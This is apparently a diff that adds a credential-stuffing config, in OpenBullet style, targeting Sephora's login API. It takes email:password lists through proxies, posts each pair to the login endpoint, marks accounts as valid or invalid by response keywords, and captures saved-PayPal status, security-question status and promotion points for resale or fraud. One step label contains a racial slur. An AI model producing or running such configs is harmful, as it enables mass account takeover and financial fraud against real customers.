@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Sephora",
+  "SuggestedBots": 75,
+  "LastModified": "2018-05-29T18:26:04.9274549+00:00",
+  "AdditionalInfo": "Runs proxyless at 1 thread",
+  "Author": "1337 | Goon",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 1935862141
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "12",
+      "Id": 160093015
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_Request REQUEST GET "https://www.sephora.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Post_HECKER REQUEST POST "https://www.sephora.com/api/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"loginForCheckout\":true,\"isKeepSignedIn\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#IS_THIS_NIGGA_REAL_OR_FAKE KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "available_bipoints" 
+    KEY "accountStatus\":\"ACTIVE\"" 
+  KEYCHAIN Failure OR 
+    KEY "there is an error with your email and/or password" 
+#PayPal PARSE "<SOURCE>" JSON "hasSavedPaypal" Recursive=FALSE -> CAP "Paypal" "" "" 
+#Security_question PARSE "<SOURCE>" JSON "hasSecurityQuestion" Recursive=FALSE -> CAP "Security question" "" "" 
+#Promotion_points PARSE "<SOURCE>" JSON "promotionPoints" Recursive=FALSE -> CAP "Points" "" "" 
